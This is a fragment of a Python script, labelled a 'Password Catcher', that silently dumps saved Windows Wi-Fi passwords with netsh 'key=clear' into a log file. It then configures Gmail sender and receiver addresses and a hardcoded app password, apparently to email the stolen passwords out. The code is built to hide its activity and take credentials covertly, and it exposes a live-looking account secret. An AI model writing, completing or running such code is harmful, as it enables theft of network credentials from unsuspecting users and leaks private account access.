...
if not os.path.exists("log.txt"):
    open("log.txt", "x").close()  # Create file if it doesn't exist
...
# Save passwords to log.txt (silently, no console output)
with open("log.txt", "a") as pas:
    for j in profiles:
        try:
            # Get password for each profile
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', j, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            if results:  # If password exists
                result = f"{j:<30}| {results[0]}\n"
                pas.write(result)  # Write to file (no print)
        except (IndexError, subprocess.CalledProcessError):
            pass  # Skip errors silently
# End Password Catcher

# Email details
sender_email = "nasrullahaminy64@gmail.com"
receiver_email = "nasrullahaminy65@gmail.com"
...
# Login credentials
password = "nmnhlipgkebvvhnq"  # Use an app password if 2FA is enabled
